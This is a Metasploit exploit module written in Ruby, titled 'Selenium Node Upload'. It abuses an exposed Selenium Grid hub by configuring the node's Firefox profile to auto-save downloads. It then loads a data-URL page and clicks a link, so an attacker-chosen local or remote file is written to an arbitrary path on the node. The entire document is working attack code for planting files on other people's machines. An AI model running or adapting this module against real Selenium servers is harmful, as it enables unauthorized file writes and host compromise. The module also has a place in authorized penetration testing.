##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'base64'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Selenium Node Upload',
      'Description'    => %q{
        Use the browser(Firefox) on a Selenium Node to upload a file.
        The upload location will create any directories that do not exist. Including dotfile directories.
        This cannot (yet): 1. Overwrite a file. 2. Upload a dotfile.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Jon Stratton' ],
      'References'     =>
        [
          [ 'URL', 'https://github.com/JonStratton/selenium-node-takeover-kit' ]
        ],
      'Platform'       => 'misc',
      'Targets'       => [
        [ 
          'Native Payload', {
            'Platform' => %w{ linux osx win unix },
            'Arch'     => ARCH_ALL
          }
        ]
      ],
      'Privileged'     => false,
      'DisclosureDate' => "Oct ?? 2020",
      'DefaultTarget'  => 0))

    register_options(
      [ 
        OptString.new('URL', [true, 'The Selenium Hub URL. http://selenium-hub.lan:4444/wd/hub']),
        OptString.new('REMOTE_FILE', [true, 'The remote destination of the uploaded file.']),
        OptString.new('LOCAL_FILE', [false, 'The local file to upload. Use this or HREF to pass in a file URL']),
        OptString.new('HREF', [false, 'A URL for a file.']),
        OptString.new('MIME', [false, 'The MIME type of the uploaded file.'])
      ])
  end

  def exploit
    begin
        require 'selenium-webdriver'
    rescue LoadError
        print_error("Failed to load selenium-webdriver. Try 'apt-get install ruby-selenium-webdriver'")
        return
    end

    url = datastore['URL']
    remote_file = datastore['REMOTE_FILE']
    local_file = datastore['LOCAL_FILE']
    href = datastore['HREF']
    mime_type = datastore['MIME']

    if not local_file.to_s.empty? # Inline for small local files
        href = 'data:application/octet-stream;charset=utf-16le;base64,%s' % [Base64.encode64( File.read(local_file) )]
        mime_type = 'application/octet-stream;'
    end

    if (not href.to_s.empty?) and mime_type.empty?
        begin
            require 'mime/types'
        rescue LoadError
            print_error("Failed to load mime/types. Try 'apt-get install ruby-mime-types'")
            return
        end
        mime_type = MIME::Types.type_for(href).first.content_type
    end

    data_url = 'data:text/html;charset=utf-8,<html><a id=f href="%s" download="%s">f</a></html>' % [href, File::basename(remote_file)]

    profile = Selenium::WebDriver::Firefox::Profile.new
    profile['browser.download.folderList'] = 2
    profile['browser.download.manager.showWhenStarting'] = false
    profile['browser.download.dir'] = File::dirname(remote_file)
    profile['browser.helperApps.neverAsk.saveToDisk'] = mime_type
    capabilities = Selenium::WebDriver::Remote::Capabilities.firefox(:firefox_profile => profile)
    driver = Selenium::WebDriver.for :remote, :url => url, :desired_capabilities => capabilities

    # Load the data URL and click the download link
    driver.navigate.to(data_url)
    driver.find_element(:id, 'f').click
    driver.quit
  end

end
